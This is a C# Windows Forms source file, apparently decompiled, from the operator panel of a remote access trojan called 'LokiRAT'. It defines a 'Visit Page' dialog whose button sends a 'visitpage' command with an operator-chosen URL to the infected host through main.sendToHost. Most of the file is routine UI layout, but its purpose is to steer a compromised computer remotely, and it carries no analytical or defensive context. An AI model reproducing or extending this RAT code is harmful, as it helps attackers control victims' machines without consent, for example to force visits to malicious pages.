namespace LokiRAT_Client
{
    using LokiRAT_Server;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class visitpage : Form
    {
        private Button button1;
        private IContainer components = null;
        private Label label1;
        private TextBox textBox1;

        public visitpage()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=visitpage|" + this.textBox1.Text);
            base.Close();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.textBox1 = new TextBox();
            this.button1 = new Button();
            this.label1 = new Label();
            base.SuspendLayout();
            this.textBox1.Location = new Point(12, 0x1c);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x142, 20);
            this.textBox1.TabIndex = 0;
            this.textBox1.Text = "http://www.google.com/";
            this.button1.Location = new Point(220, 0x43);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x72, 0x17);
            this.button1.TabIndex = 1;
            this.button1.Text = "Visit";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 12);
            this.label1.Name = "label1";
            this.label1.Size = new Size(60, 13);
            this.label1.TabIndex = 2;
            this.label1.Text = "Page URL:";
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x15a, 100);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.button1);
            base.Controls.Add(this.textBox1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "visitpage";
            this.Text = "Visit Page | LokiRAT";
            base.ResumeLayout(false);
            base.PerformLayout();
        }
    }
}

